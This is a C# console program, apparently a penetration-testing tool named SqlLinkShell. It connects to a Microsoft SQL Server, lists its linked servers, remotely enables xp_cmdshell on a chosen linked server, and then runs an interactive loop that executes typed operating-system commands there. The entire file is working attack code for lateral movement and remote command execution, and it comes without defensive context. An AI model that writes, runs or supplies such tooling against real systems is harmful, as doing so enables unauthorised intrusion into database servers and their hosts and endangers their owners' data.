using System;
using System.IO;
using System.Text;
using System.Data.SqlClient;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SqlLinkShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            String link = "exec sp_linkedservers;";
            SqlCommand cmd = new SqlCommand(link, conn);
            SqlDataReader read = cmd.ExecuteReader();

            while (read.Read())
            {
                Console.WriteLine($"[+] Linked server {read[0]} found!");
            }
            read.Close();

            Console.Write("[*] Would you like to test the link? [y/n]: ");
            String answer = Console.ReadLine();

            if (answer.ToLower() == "y")
            {
                Console.Write("[*] Enter new target server: ");
                String target = Console.ReadLine();

                try
                {
                    String user = $"select myuser from openquery(\"{target}\", 'select system_user as myuser');";
                    cmd = new SqlCommand(user, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Executing as {read[0]} on {target}");
                    read.Close();

                    Console.Write("[*] Would you like to enable xp_cmdshell [y/n]: ");
                    answer = Console.ReadLine();

                    if (answer.ToLower() == "y")
                    {
                        try
                        {
                            string cwd = Directory.GetCurrentDirectory();
                            String enableOpts = $"exec ('sp_configure ''show advanced options'', 1; reconfigure;') at {target};";
                            String enableCmd = $" exec ('sp_configure ''xp_cmdshell'', 1; reconfigure;') at {target};";

                            cmd = new SqlCommand(enableOpts, conn);
                            read = cmd.ExecuteReader();
                            read.Close();

                            cmd = new SqlCommand(enableCmd, conn);
                            read = cmd.ExecuteReader();
                            read.Close();

                            Console.WriteLine("[+] Entering new shell session");
                            Console.Write($"\nMSSQL {cwd}> ");
                            String command = Console.ReadLine();
                            String execCmd = $"exec ('xp_cmdshell ''{command}'';') at {target};";
                            cmd = new SqlCommand(execCmd, conn);
                            read = cmd.ExecuteReader();
                            read.Read();
                            Console.WriteLine($"{read[0]}");
                            read.Close();

                            while (true)
                            {
                                Console.Write($"MSSQL {cwd}> ");
                                command = Console.ReadLine();
                                execCmd = $"exec ('xp_cmdshell ''{command}'';') at {target};";
                                cmd = new SqlCommand(execCmd, conn);
                                read = cmd.ExecuteReader();
                                read.Read();
                                Console.WriteLine($"{read[0]}");
                                read.Close();

                                if (String.Equals(command, "exit"))
                                {
                                    break;
                                }
                            }

                            conn.Close();
                        }
                        catch
                        {
                            Console.WriteLine("[-] Unable to enable xp_cmdshell!");
                            conn.Close();
                            Environment.Exit(0);
                        }
                    }
                }
                catch
                {
                    Console.WriteLine("[-] Server link appears unreachable");
                    conn.Close();
                    Environment.Exit(0);
                }
            }
            else if (answer.ToLower() == "n")
            {
                conn.Close();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Invalid selection!");
                conn.Close();
                Environment.Exit(0);
            }
        }
    }
}
